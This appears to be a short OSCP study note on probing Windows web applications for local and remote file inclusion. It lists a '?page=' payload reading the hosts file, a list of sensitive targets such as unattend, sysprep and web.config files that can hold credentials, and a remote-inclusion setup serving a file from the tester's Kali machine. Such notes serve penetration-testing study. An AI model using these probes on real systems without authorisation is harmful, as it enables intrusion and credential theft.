Notable Paths to Take a look at

Test for local file inclusion
```
?page=C:/Windows/System32/drivers/etc/hosts
```

C:/Windows/System32/drivers/etc/hosts C:/Windows/Panther/Unattend/Unattended.xml C:/Windows/Panther/Unattended.xml 
C:/Windows/Panther/Unattend.txt 
C:/Unattend.xml 
C:/Autounattend.xml 
C:/Windows/system32/sysprep

C:/inetpub/wwwroot 
C:/inetpub/wwwroot/web.config 
C:/inetpub/logs/logfiles

Test for remote file inclusion

```
touch test.txt && python -m http.server 80
```

?page=
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `http://${KaliIP}:80/test.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
